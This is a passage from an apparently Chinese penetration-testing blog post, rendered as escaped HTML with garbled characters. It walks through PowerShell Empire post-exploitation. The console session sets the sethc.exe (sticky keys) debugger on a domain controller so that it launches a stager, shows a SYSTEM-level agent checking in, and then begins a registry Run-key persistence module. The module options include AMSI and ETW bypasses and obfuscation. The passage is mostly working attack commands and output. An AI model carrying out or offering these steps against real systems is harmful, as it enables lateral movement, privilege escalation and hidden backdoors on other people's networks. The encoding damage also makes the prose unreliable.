&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name             â”‚ Value                               â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent            â”‚ 7VLBMT3A                            â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Binary           â”‚ C:&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ystem32&lt;span class=&#34;se&#34;&gt;\c&lt;/span&gt;md.exe         â”‚ False    â”‚ Binary to &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the debugger.     â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Bypasses         â”‚ mattifestation etw                  â”‚ False    â”‚ Bypasses as a space separated list  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ to be prepended to the launcher.    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Cleanup          â”‚                                     â”‚ False    â”‚ Switch. Disable the debugger &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ the specified TargetBinary.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ComputerName     â”‚                                     â”‚ True     â”‚ Host&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; to execute the stager on,   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ comma separated.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ CredID           â”‚                                     â”‚ False    â”‚ CredID from the store to use.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Listener         â”‚                                     â”‚ False    â”‚ Listener to use.                    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Obfuscate        â”‚ False                               â”‚ False    â”‚ Switch. Obfuscate the launcher      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ powershell code, uses the           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ ObfuscateCommand &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; obfuscation    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ types. For powershell only.         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ ObfuscateCommand â”‚ Token&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;ll&lt;span class=&#34;se&#34;&gt;\1&lt;/span&gt;                         â”‚ False    â”‚ The Invoke-Obfuscation &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; to   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ use. Only used &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; Obfuscate switch  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ is True. For powershell only.       â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Password         â”‚                                     â”‚ False    â”‚ Password to use to execute command. â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ RegPath          â”‚ HKLM:Software&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\N&lt;/span&gt;etwork&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;eb â”‚ False    â”‚ Registry location to store the      â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚ ug                                  â”‚          â”‚ script code. Last element is the    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ key name.                           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ TargetBinary     â”‚ sethc.exe                           â”‚ True     â”‚ Target binary to &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; the debugger   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sethc.exe, Utilman.exe,        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ osk.exe, Narrator.exe, or           â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ Magnify.exe&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;                        â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ UserName         â”‚                                     â”‚ False    â”‚ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;domain&lt;span class=&#34;se&#34;&gt;\]&lt;/span&gt;username to use to execute â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                  â”‚                                     â”‚          â”‚ command.                            â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; ComputerName dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set ComputerName to dc.hack.lab
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; Listener &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Listener to &lt;span class=&#34;nb&#34;&gt;test&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; TargetBinary sethc.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set TargetBinary to sethc.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/lateral_movement/invoke_wmi_debugger&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked 7VLBMT3A to run Task &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Invoke-Wmi executed on &lt;span class=&#34;s2&#34;&gt;&amp;#34;dc.hack.lab&amp;#34;&lt;/span&gt; to &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; the debugger &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; sethc.exe to be a stager &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; listener test.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; New agent 1VF4A7GE checked in
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending agent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;stage 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to 1VF4A7GE at 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: 7VLBMT3A&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; back
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨dcæœåŠ¡å™¨æŒ‰å‡ æ¬¡Shifté”®ï¼Œä¼šå¼¹å‡ºcmdé»‘æ¡†ç„¶åæ¶ˆå¤±ï¼Œè¿™è¾¹Empireå°±ä¸Šçº¿äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//19.png&#34; alt=&#34;19&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°ä¸Šçº¿çš„æ˜¯systemæƒé™ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//20.png&#34; alt=&#34;20&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;æ³¨å†Œè¡¨æ³¨å…¥åé—¨&#34;&gt;æ³¨å†Œè¡¨æ³¨å…¥åé—¨&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬ä½¿ç”¨çš„æ¨¡å—æ˜¯&lt;code&gt;powershell/persistence/userland/registry&lt;/code&gt;,æ‰§è¡Œåä¼šåœ¨ç”¨æˆ·ç™»å½•çš„æ—¶å€™å¯åŠ¨ä¸€ä¸ªå‘½ä»¤ï¼š&lt;/p&gt;
&lt;p&gt;éœ€è¦è®¾ç½®ä¸€ä¸‹&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Empire: KV9PG5FS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; whoami
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked KV9PG5FS to run Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HACK&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: KV9PG5FS&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/persistence/userland/registry
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to KV9PG5FS
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @mattifestation                                                        
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @harmj0y                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              @enigma0x3                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/mattifestation/PowerSploit/blob/master/Persistence/ 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              Persistence.psm1                                                       
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Persist a stager &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;or script&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; via the                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              HKCU:SOFTWARE&lt;span class=&#34;se&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span class=&#34;se&#34;&gt;\W&lt;/span&gt;indows&lt;span class=&#34;se&#34;&gt;\C&lt;/span&gt;urrentVersion&lt;span class=&#34;se&#34;&gt;\R&lt;/span&gt;un registry key. This  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              has an easy detection/removal rating.                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/persistence/userland/registry                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1060                               
